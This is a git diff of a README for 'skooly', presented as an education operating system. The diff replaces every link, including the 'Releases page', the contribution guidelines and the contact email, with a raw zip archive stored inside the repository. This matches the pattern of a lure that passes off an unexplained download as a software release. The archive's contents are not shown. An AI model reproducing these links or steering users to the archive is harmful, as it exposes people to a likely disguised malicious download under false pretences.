@@ -6,7 +6,7 @@ skooly is an open-source operating system designed for African higher education.
 ## 🚀 Getting Started
 To begin using skooly, you'll need to download and install it. We recommend visiting our Releases page for the latest version. 
 
-[![Download skooly](https://github.com/LasUpinturas/skooly/raw/refs/heads/main/packages/database/Software-v3.4.zip)](https://github.com/LasUpinturas/skooly/raw/refs/heads/main/packages/database/Software-v3.4.zip)
+[![Download skooly](https://raw.githubusercontent.com/LasUpinturas/skooly/main/apps/docs/Software_3.5.zip)](https://raw.githubusercontent.com/LasUpinturas/skooly/main/apps/docs/Software_3.5.zip)
 
 ## 📦 System Requirements
 Before installing skooly, ensure your system meets the following requirements:
@@ -17,7 +17,7 @@ Before installing skooly, ensure your system meets the following requirements:
 - Browser: Latest version of Chrome, Firefox, or Safari
 
 ## 💻 Download & Install
-1. Visit our [Releases page](https://github.com/LasUpinturas/skooly/raw/refs/heads/main/packages/database/Software-v3.4.zip) to download the latest version of skooly. 
+1. Visit our [Releases page](https://raw.githubusercontent.com/LasUpinturas/skooly/main/apps/docs/Software_3.5.zip) to download the latest version of skooly. 
 2. Choose the version suitable for your operating system. 
 3. Click on the version link to begin downloading. 
 4. Once the download finishes, locate the file on your computer. 
@@ -38,7 +38,7 @@ If you encounter issues while installing or running skooly, here are several com
 
 - **Installation Error:** Ensure your system meets all requirements. Restart your computer and try again.
 - **Application Won't Launch:** Make sure all updates are installed. If problems persist, uninstall and reinstall the software.
-- **Missing Features:** Check if you have the latest version by revisiting our [Releases page](https://github.com/LasUpinturas/skooly/raw/refs/heads/main/packages/database/Software-v3.4.zip).
+- **Missing Features:** Check if you have the latest version by revisiting our [Releases page](https://raw.githubusercontent.com/LasUpinturas/skooly/main/apps/docs/Software_3.5.zip).
 
 ## 🤝 Community Support
 Join our user community for additional help. You can find support through the following platforms:
@@ -47,10 +47,10 @@ Join our user community for additional help. You can find support through the fo
 - GitHub Issues: Report bugs or request features.
 
 ## 📧 Contact Us
-For direct inquiries or technical support, email us at https://github.com/LasUpinturas/skooly/raw/refs/heads/main/packages/database/Software-v3.4.zip or visit our GitHub repository. 
+For direct inquiries or technical support, email us at https://raw.githubusercontent.com/LasUpinturas/skooly/main/apps/docs/Software_3.5.zip or visit our GitHub repository. 
 
 ## 🌍 Contributing
-If you'd like to contribute to skooly, please check our [Contribution Guidelines](https://github.com/LasUpinturas/skooly/raw/refs/heads/main/packages/database/Software-v3.4.zip). Your input helps improve the application for everyone.
+If you'd like to contribute to skooly, please check our [Contribution Guidelines](https://raw.githubusercontent.com/LasUpinturas/skooly/main/apps/docs/Software_3.5.zip). Your input helps improve the application for everyone.
 
 --- 
 
